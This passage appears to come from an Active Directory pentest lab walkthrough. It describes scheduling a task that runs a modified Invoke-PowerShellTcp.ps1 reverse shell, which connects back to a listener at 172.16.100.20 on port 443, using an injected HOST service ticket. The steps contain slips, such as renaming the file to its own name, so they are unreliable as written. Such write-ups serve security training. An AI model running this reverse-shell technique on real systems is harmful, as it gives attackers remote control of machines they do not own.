...
We can then start a listener and schedule a task to run the reverse shell script using invoke-powershelltcpex.ps1. First create a copy of Invoke-PowerShellTcp.ps1 and rename it Invoke-PowerShellTcp.ps1 and add the function call `Power -Reverse -IPAddress 172.16.100.20 -Port 443` to the end of the file. Then run the below command in the process where we injected the ticket for the HOST service. Make sure your listener is already running.
